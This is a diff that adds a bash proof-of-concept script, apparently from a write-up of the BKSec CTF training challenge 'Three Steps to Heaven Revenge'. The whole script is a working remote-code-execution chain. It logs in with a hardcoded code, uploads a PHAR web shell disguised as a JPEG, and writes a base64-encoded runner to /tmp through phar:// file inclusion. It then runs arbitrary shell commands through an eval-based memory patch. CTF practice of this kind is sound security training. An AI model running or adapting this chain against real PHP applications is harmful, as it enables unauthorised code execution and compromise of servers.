@@ -276,3 +276,48 @@ if($cmd!==''){
 echo "\n__E__\n";
 ```
 
+
+rce.sh:
+```bash
+#!/usr/bin/env bash
+# PoC RCE - BKSec "Three Steps to Heaven Revenge"
+# Usage: ./poc_rce.sh [base_url] [command]
+# Example: ./poc_rce.sh https://web-...training.bksec.vn/ 'id; /readflag'
+set -u
+DIR="$(cd "$(dirname "$0")" && pwd)"
+B="${1:-https://web-3-steps-to-heaven-revenge-fcc3c83a769a.training.bksec.vn/}"
+CMD="${2:-id}"
+CJ="$DIR/.poc_cookies.txt"
+PHAR="$DIR/phar_multi.jpg"
+CODE='CYBER2026-ABC1234@XY_123456'
+LFI="$B/index.php?page=phar:///var/www/html/user_submissions/phar_multi.jpg/shell.php"
+
+rm -f "$CJ"
+
+# 1) Login bang VIP code hop le
+curl -s -c "$CJ" -b "$CJ" -m 20 -X POST "$B/index.php?page=login.php" \
+  --data-urlencode "vip_code=$CODE" -o /dev/null || exit 1
+
+# 2) Upload PHAR shell duoi .jpg
+UP=$(curl -s -c "$CJ" -b "$CJ" -m 30 -X POST "$B/upload.php" \
+  -F "uploadFile=@$PHAR;filename=phar_multi.jpg;type=image/jpeg")
+case "$UP" in
+  *"successfully"*) : ;;
+  *) echo "[!] Upload that bai: $UP" >&2; exit 1 ;;
+esac
+
+# 3) Ghi runner vao /tmp/r.php (noi dung runner_payload.php, eval khong can <?php)
+RB64=$(base64 -w0 "$DIR/runner_payload.php")
+WRITE="file_put_contents('/tmp/r.php',base64_decode('$RB64'));"
+W64=$(printf '%s' "$WRITE" | base64 -w0)
+curl -s -b "$CJ" -m 30 -G "$LFI" \
+  --data-urlencode "b64=$W64" -o /dev/null
+
+# 4) Thuc thi lenh qua mem-patch (strtoupper handler -> zif_system)
+X=$(printf '%s' "$CMD" | base64 -w0)
+EV=$(printf '%s' "eval(file_get_contents('/tmp/r.php'));" | base64 -w0)
+curl -s -b "$CJ" -m 40 -G "$LFI" \
+  --data-urlencode "b64=$EV" --data-urlencode "x=$X" \
+  | awk '/__B__/{f=1;next}/__E__/{f=0}f'
+```
+
